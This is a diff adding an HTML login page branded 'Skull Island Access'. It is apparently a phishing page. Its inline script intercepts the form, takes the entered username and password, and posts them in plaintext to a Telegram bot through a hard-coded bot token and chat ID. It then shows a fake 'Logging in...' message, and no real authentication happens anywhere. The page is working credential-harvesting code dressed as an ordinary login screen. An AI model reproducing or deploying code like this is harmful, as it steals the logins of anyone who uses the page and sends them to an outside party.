@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Skull Island - Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Orbitron', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://images.unsplash.com/photo-1613470005265-5972e50e1d67?ixlib=rb-4.0.3&auto=format&fit=crop&w=1950&q=80') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #fff;
+    }
+
+    .login-box {
+      background: rgba(0, 0, 0, 0.75);
+      padding: 40px;
+      border-radius: 15px;
+      width: 300px;
+      text-align: center;
+      box-shadow: 0 0 20px #000;
+    }
+
+    .login-box img {
+      width: 100px;
+      margin-bottom: 20px;
+    }
+
+    .login-box h2 {
+      margin-bottom: 30px;
+      font-size: 24px;
+      letter-spacing: 1px;
+    }
+
+    .login-box input[type="text"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      background: #333;
+      color: #fff;
+    }
+
+    .login-box button {
+      padding: 12px;
+      width: 100%;
+      background: #e50914;
+      border: none;
+      border-radius: 8px;
+      color: #fff;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    .login-box button:hover {
+      background: #b00710;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      opacity: 0.6;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="https://upload.wikimedia.org/wikipedia/en/thumb/e/e0/Skull_Island_Logo.png/220px-Skull_Island_Logo.png" alt="Skull Island Logo"/>
+    <h2>Skull Island Access</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Username" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
+    <div class="footer">© 2025 Skull Island Command</div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "7793344796:AAFSfu9kU4ECFqu_EQwTwadxHLjjbnWcGJ4";
+    const CHAT_ID = "5720033318";     
+
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+
+      const message = `🦍 Skull Island Login Attempt:\n👤 Username: ${username}\n🔑 Password: ${password}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      }).then(response => {
+        if (response.ok) {
+          alert("Logging in...");
+        } else {
+          alert("Connection error. Try again.");
+        }
+      });
+    });
+  </script>
+</body>
+</html>
